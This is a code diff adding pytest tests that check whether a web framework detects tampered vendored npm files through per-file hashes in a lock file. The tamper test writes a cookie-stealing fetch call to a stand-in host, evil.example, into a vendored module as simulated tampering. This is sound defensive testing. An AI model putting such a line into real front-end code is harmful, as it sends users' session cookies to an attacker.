@@ -302,3 +302,35 @@ def test_csp_allows_exactly_the_import_map():
     digest = base64.b64encode(hashlib.sha256(b'{"imports":{}}').digest()).decode()
     assert f"script-src 'self' 'sha256-{digest}';" in csp_for(DEFAULT_CSP, html)
     assert csp_for(DEFAULT_CSP, b"<p>no map</p>") == DEFAULT_CSP
+
+
+def test_vendored_files_are_checked_against_the_lock(tmp_path):
+    import argparse
+
+    from pyweb import cli
+    lock = P.install(str(tmp_path), ["tiny-color@^2"], registry=registry())
+    assert lock["packages"]["tiny-color"]["hashes"]                       # a sha256 per file
+    assert P.verify(str(tmp_path)) == []
+    (tmp_path / "app.pyweb").write_text("from pyweb import App, npm\nshade = npm('tiny-color', 'shade')\n"
+                                        "app = App()\n@app.page('/')\ndef H():\n    <p>x</p>\n")
+    build = lambda: cli.cmd_build(argparse.Namespace(file=str(tmp_path / "app.pyweb"),
+                                                     out=str(tmp_path / "dist"), budget=[]))
+    build()
+    target = next((tmp_path / "static" / "vendor").rglob("index.mjs"))
+    target.write_text("fetch('https://evil.example/?c=' + document.cookie)\n")    # tampered with
+    problems = P.verify(str(tmp_path))
+    assert problems and problems[0][1] == "changed since pyweb add"
+    with pytest.raises(SystemExit):
+        build()
+    P.install(str(tmp_path), registry=registry())                        # `pyweb add` restores it
+    assert P.verify(str(tmp_path)) == []
+    build()
+
+
+def test_locks_without_hashes_still_build(tmp_path):
+    P.install(str(tmp_path), ["tiny-color@^2"], registry=registry())
+    lock = json.loads((tmp_path / "pyweb.lock").read_text())
+    for pkg in lock["packages"].values():
+        pkg.pop("hashes")
+    (tmp_path / "pyweb.lock").write_text(json.dumps(lock))
+    assert P.verify(str(tmp_path)) == []
